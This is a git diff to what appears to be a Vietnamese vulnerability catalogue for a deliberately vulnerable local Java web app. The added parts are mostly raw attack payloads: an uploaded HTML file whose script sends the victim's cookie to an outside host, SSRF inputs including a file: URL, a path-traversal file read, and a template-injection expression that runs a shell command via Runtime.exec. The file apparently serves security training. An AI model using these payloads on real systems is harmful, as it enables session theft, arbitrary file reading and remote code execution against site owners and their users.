@@ -61,7 +61,7 @@
 - payload: id=4
 
 ### 5. POST "/upAVTVuln"
-- Bug: upload file avt tùy ý dẫn tới RCE
+- Bug: upload file avt tùy ý dẫn tới RCE, CSS
 - params: image
 - Payload: 
 ```
@@ -89,6 +89,7 @@ Content-Type: image/svg+xml
 ------WebKitFormBoundaryCsWyqYFoOyp4thoH--
 ```
 - Payload RCE: 
++ Upfile:
 ```
    POST /upAVT HTTP/1.1
 Host: localhost:8080
@@ -114,10 +115,61 @@ Content-Type: image/svg+xml
 
 ------WebKitFormBoundaryCsWyqYFoOyp4thoH--
 ```
+- Payload CSS:
+```
+POST /upAVTVuln HTTP/1.1
+Host: localhost:8080
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCsWyqYFoOyp4thoH
+Cookie: JSESSIONID=69B4BBFF8707651A8E0F0D2D8E83DF3D
+Connection: close
+
+------WebKitFormBoundaryCsWyqYFoOyp4thoH
+Content-Disposition: form-data; name="image"; filename="css.html"
+Content-Type: image/svg+xml
+
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <title>VStore</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+</head>
+<body>
+<h1>Test PoC CSS</h1>
+<script>
+            var cookie = document.cookie;
+            let xhr = new XMLHttpRequest();
+            let url = "http://sonnguy3n.info:8888/?a=";					
+            xhr.open("GET", url+cookie, true);						            
+            xhr.send();
+</script>
+</body>
+</html>
+
+------WebKitFormBoundaryCsWyqYFoOyp4thoH--
+```
++ Link CSS: GET "/getImage?name=css.html"
+
 
 ### 6. POST "/upAVTUrlVuln"
 - Bug: SSRF
 - Params: url
-- Payload: "HTTP://attacker.com/pic.png"
+- Payload: 
+
+"http://host.com/pic.png"
+
+"file:c:/C:/Windows/system.ini"
+
+### 7. GET "/getImage"
+- Bug: get file tùy ý
+- Params: name
+- payload: "../../templates/home.html"
    
-   
+### 8. GET
+- Bug: Template Injection
+- Payload:
+```
+T(org.apache.commons.io.IOUtils).toString(
+    T(java.lang.Runtime).getRuntime().exec('powershell ls').getInputStream(),
+    T(java.nio.charset.StandardCharsets).UTF_8.name()
+    )
+```
